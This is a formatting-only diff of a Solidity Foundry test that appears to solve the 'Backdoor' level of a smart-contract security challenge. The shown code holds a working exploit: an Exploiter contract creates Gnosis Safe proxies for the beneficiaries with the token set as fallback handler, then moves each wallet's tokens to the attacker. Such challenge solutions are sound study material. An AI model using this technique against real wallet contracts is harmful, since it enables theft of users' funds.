@@ -43,9 +43,7 @@ contract Backdoor is Test {
         david = users[3];
         vm.label(david, "David");
 
-        attacker = payable(
-            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
-        );
+        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
         vm.label(attacker, "Attacker");
 
         // Deploy Gnosis Safe master copy and factory contracts
@@ -84,18 +82,17 @@ contract Backdoor is Test {
         vm.startPrank(attacker);
 
         /**
-        WalletRegistry checks:
-        1. calldata starts with GnosisSafe.setup.selector
-        2. owners.length == 1
-        3. threshold == 1
-        4. initializer has to be an abi.encodeWithSelector(GnosisSafe.setup.selector, args...);
-
-        */
+         * WalletRegistry checks:
+         * 1. calldata starts with GnosisSafe.setup.selector
+         * 2. owners.length == 1
+         * 3. threshold == 1
+         * 4. initializer has to be an abi.encodeWithSelector(GnosisSafe.setup.selector, args...);
+         */
 
         /**
-        Exploit: deploy 4 dummy Safe contracts, call setup() setting the owners to be the beneficiaries
-            then call proxyCreated manually, passing as proxy the attacker address.
-        */
+         * Exploit: deploy 4 dummy Safe contracts, call setup() setting the owners to be the beneficiaries
+         * then call proxyCreated manually, passing as proxy the attacker address.
+         */
 
         Exploiter exploiter = new Exploiter(
             users,
@@ -148,7 +145,9 @@ contract Exploiter is Test {
         GnosisSafeProxyFactory _walletFactory,
         WalletRegistry _walletRegistry,
         address _dvt
-    ) public {
+    )
+        public
+    {
         attacker = payable(msg.sender);
         users = _users;
         masterCopy = _masterCopy;
@@ -161,26 +160,12 @@ contract Exploiter is Test {
         address[] memory safes = new address[](4);
         bytes memory selector = abi.encodePacked(GnosisSafe.setup.selector);
 
-        for (uint256 i = 0; i < 4; ) {
+        for (uint256 i = 0; i < 4;) {
             owners[0] = users[i];
             setupData = abi.encodeWithSelector(
-                GnosisSafe.setup.selector,
-                owners,
-                1,
-                address(0),
-                hex"",
-                dvt,
-                address(0),
-                0,
-                payable(address(0))
+                GnosisSafe.setup.selector, owners, 1, address(0), hex"", dvt, address(0), 0, payable(address(0))
             );
-            safes[i] = address(
-                walletFactory.createProxyWithCallback(
-                    address(masterCopy), 
-                    setupData,
-                    0,
-                    walletRegistry)
-            );
+            safes[i] = address(walletFactory.createProxyWithCallback(address(masterCopy), setupData, 0, walletRegistry));
 
             safes[i].call(abi.encodeWithSignature("transfer(address,uint256)", attacker, 10 ether));
             unchecked {
